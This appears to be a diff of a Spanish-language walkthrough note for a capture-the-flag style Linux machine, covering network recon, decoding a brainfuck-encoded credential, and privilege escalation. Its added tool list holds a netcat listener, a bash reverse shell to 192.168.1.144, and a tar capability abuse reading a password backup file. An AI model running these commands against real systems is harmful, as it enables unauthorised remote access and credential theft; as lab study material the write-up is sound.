@@ -1,4 +1,14 @@
-
+Herramientas:
+	- arp-scan
+	- ping
+	- nmap
+	- Visor de codigo del navegador
+	- https://www.dcode.fr/brainfuck-language
+	- enum4linux
+	- nc -lvnp 1234
+	- bash -i >/dev/tcp/192.168.1.144/1234 0>&1
+	- con getcap -r / 2>dev/null
+	- ./tar -cf {nombre fichero} /var/backups/.old_pass.bak
 
 reconocimiento de la red:
 
@@ -6,7 +16,7 @@ reconocimiento de la red:
 Ping a la maquina para ver si hay conectividad y el TTL:
 ![[Ping y ver TTL.png]]
 
-Conedtividad y TTL 64--> maquina LINUX
+Conectividad y TTL 64--> maquina LINUX
 Nmap:
 sudo nmap -p- --open -sS -Pn -sC -sV 192.168.1.136
 
@@ -43,13 +53,13 @@ Decodeamos web para decodear este mensaje (https://www.dcode.fr/brainfuck-langua
 y obtenemos:
 .2uqPEfj3D<P'a-3
 
-Acccedemos al puerto 10000:
+Accedemos al puerto 10000:
 ![[Acceso al puerto 10000.png]]
-volvemos a acceder ahora con SSL (segun mensaje)
+volvemos a acceder ahora con SSL (según mensaje)
 y vemos un panel de Login:
 ![[Panel de Login.png]]
 
-Revisameos el puerto 20000:
+Revisamos el puerto 20000:
 ![[Acceso al puerto 20000.png]]
 Usamos la herramienta Enum4 Linux:
 comando:
@@ -96,6 +106,7 @@ sudo -l no funciona
 ![[Escalado sudo -l.png]]
 
 Vemos las capabilities:
+con getcap -r / 2>dev/null
 ![[Capabilitis del usuario.png]]
 
 Y encontramos  que tenemos acceso a tar
